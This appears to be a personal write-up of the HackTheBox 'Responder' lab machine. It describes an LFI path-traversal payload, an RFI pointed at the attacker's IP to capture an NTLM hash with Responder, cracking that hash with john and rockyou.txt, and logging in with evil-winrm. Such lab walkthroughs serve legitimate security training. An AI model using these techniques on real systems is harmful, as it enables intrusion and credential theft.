---
title: "Responder"
category: ["HTB", "Machines", "Responder"]
---

Note title: Responder

- Initially, this machine doesn't let us access the web page
- We go to /etc/hosts and use nano to add the IP and a name
- We run nmap
![Pasted image 20240305194530](/VaultSite/wiki-images/Pasted%20image%2020240305194530.png)
- We find it uses PHP
- We access the page and set it to French to see the parameter used for language switching
- Once discovered, we remove everything up to page= to exploit a Local File Inclusion (LFI) vulnerability. The parameter used is _../../../../../../../../windows/system32/drivers/etc/hosts_. Using "../" allows access to "etc/hosts".
- To exploit Remote File Inclusion (RFI), we need the target machine's IP address, in this case _//10.10.14.6/somefile_
- To specify a port when using **Responder**, we use -I
- Now we go to the webpage and after page= we put our IP //ip/ShareFileHTB while running RESPONDER
- In the terminal, we'll see this:
- ![Pasted image 20240305202829](/VaultSite/wiki-images/Pasted%20image%2020240305202829.png)
- Once we copy the hash, we create one with echo
- ![Pasted image 20240305203123](/VaultSite/wiki-images/Pasted%20image%2020240305203123.png)
- We check if it was created with ls
- Now we unzip the rockyou.txt file containing over 14 million passwords we can test
![Pasted image 20240305203419](/VaultSite/wiki-images/Pasted%20image%2020240305203419.png)
- Now with john, we match the hash we created earlier with the password list
![Pasted image 20240305203530](/VaultSite/wiki-images/Pasted%20image%2020240305203530.png)
- We can see the administrator password is Badminton
- We run nmap to check which TCP port is listening
- Now we use evil-winrm to remotely manage Windows systems
- ![Pasted image 20240305204258](/VaultSite/wiki-images/Pasted%20image%2020240305204258.png)
- Now we navigate through the Windows system
![Pasted image 20240305204531](/VaultSite/wiki-images/Pasted%20image%2020240305204531.png)
![Pasted image 20240305204627](/VaultSite/wiki-images/Pasted%20image%2020240305204627.png)
- Once we find flag.txt, we type flag.txt to display the flag directly









